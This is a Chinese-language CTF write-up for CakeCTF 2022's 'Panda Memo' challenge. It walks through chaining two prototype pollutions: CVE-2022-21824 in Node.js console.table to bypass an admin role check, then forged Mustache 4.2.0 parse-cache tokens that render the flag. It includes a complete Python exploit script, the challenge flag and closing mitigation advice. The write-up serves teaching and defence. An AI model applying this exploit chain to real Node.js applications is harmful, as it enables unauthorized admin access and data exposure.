# CakeCTF 2022 Panda Memo Writeup

## 题目简述

Panda Memo 是一个 Node.js/Express 备忘录服务。普通用户按来源 IP 保存 memo，管理员则可通过秘密参数查看或编辑任意 IP 的数据。`/admin` 使用 Mustache 渲染 flag，但模板只在 `is_admin` 为真时显示它。

题目链条包含两次原型污染：先利用旧版 Node.js `console.table` 的 CVE-2022-21824 污染 `Object.prototype[0]`，绕过应用自己的管理员角色检查；再把 Mustache 的解析缓存键写入 `Object.prototype`，让模板引擎使用伪造 token 直接渲染 `flag`。

## 解题过程

### 第一次污染：绕过角色判断

`/show` 接受 GET 请求体，并在 `debug == true` 时执行：

```javascript
console.table(memo, req.body.inspect);
```

在存在 CVE-2022-21824 的 Node.js 版本中，把 `inspect` 设置为 `['__proto__']` 可令 `Object.prototype['0']` 获得一个空字符串属性。先调用 `/new` 确保表中有内容，再发送：

```json
{"debug":true,"inspect":["__proto__"]}
```

应用的角色判断为：

```javascript
getAdminRole(req)[0] !== undefined
```

非管理员得到的是空数组 `[]`。污染后，`[][0]` 会从 `Object.prototype['0']` 继承空字符串，不再是 `undefined`，所以普通用户也会进入管理员分支。

### 第二次污染：伪造 Mustache 缓存

`/edit` 在管理员分支中允许客户端指定 `ip`：

```javascript
ip = req.body.ip;
memo[ip][index] = new_memo;
```

令 `ip='__proto__'`，则 `memo[ip]` 指向 `Object.prototype`。这样可以给所有普通对象写入任意继承属性。

Mustache 4.2.0 会用“完整模板文本 + 分隔符”作为解析缓存键。默认分隔符下，键为：

```text
<admin.html 的完整内容>:{{:}}
```

把这个属性污染为伪造 token：

```json
[["name","flag",0,100]]
```

Mustache 再次渲染 `/admin` 时，会把缓存值当作“直接输出变量 `flag`”的解析结果，不再执行原模板中的 `is_admin` 条件区块。

### 完整请求序列

```python
import json
import requests

base = 'http://TARGET'
auth = requests.auth.HTTPBasicAuth('guest', 'INSTANCE_PASSWORD')

with open('views/admin.html', 'r', encoding='utf-8') as f:
    template = f.read()

# 1. 让 memo 中至少存在一行数据。
requests.post(base + '/new', auth=auth).raise_for_status()

# 2. 触发 CVE-2022-21824：Object.prototype['0'] = ''。
requests.get(
    base + '/show',
    auth=auth,
    headers={'Content-Type': 'application/json'},
    data=json.dumps({
        'debug': True,
        'inspect': ['__proto__'],
    }),
).raise_for_status()

# 3. 角色判断已被绕过，继续污染 Mustache 缓存键。
cache_key = template + ':{{:}}'
fake_tokens = [['name', 'flag', 0, 100]]
requests.post(
    base + '/edit',
    auth=auth,
    json={
        'ip': '__proto__',
        'index': cache_key,
        'memo': fake_tokens,
    },
).raise_for_status()

# 4. 触发使用伪造 token 的模板渲染。
result = requests.get(base + '/admin', auth=auth)
result.raise_for_status()
print(result.text)
```

页面最终直接渲染：

```text
CakeCTF{pollute_and_p011u73_4nd_PoLLuTE!}
```

## 方法总结

这题不是一次污染直接读 flag，而是两层信任边界串联：运行时库漏洞先污染数组索引，应用把继承属性误判为管理员角色；获得跨 IP 编辑能力后，再污染模板解析缓存，改变 Mustache 对固定模板的语义。

防护应同时覆盖运行时升级和应用代码：使用已修复 CVE-2022-21824 的 Node.js，不把用户字段传给调试 API；权限判断使用显式布尔值；字典使用 `Object.create(null)` 或 `Map`；访问自有属性时使用 `Object.hasOwn`；模板缓存也不能从可污染的原型链取值。
